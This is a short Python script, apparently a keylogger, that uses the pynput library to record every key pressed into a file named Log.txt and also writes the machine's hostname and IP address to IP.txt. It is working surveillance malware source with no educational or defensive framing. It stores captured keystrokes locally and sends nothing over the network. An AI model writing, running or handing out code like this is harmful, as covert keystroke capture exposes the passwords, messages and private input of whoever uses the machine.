from pynput.keyboard import Listener
import socket

# Get the hostname and IP address
hostname = socket.gethostname()
IP = socket.gethostbyname(hostname)

# Write hostname and IP to a file
with open("IP.txt", 'a') as t:
    t.write(f"Hostname: {hostname}\n")
    t.write(f"IP Address: {IP}\n")

def filewriter(key):
    letter = str(key)
    letter = letter.replace("'", "")

    # Handle specific keys
    if letter == "Key.space":
        letter = '_'
    elif letter == "Key.enter":
        letter = '\n'
    elif letter in ["Key.cmd", "Key.ctrl_l\x1a", "Key.backspace", "Key.shift", "Key.caps_lock", "Key.alt_l"]:
        letter = ''  # Exclude these keys from the log

    # Write the key to the log file
    with open("Log.txt", 'a') as f:
        f.write(letter)

# Start listening for keyboard events
with Listener(on_press=filewriter) as listener:
    listener.join()
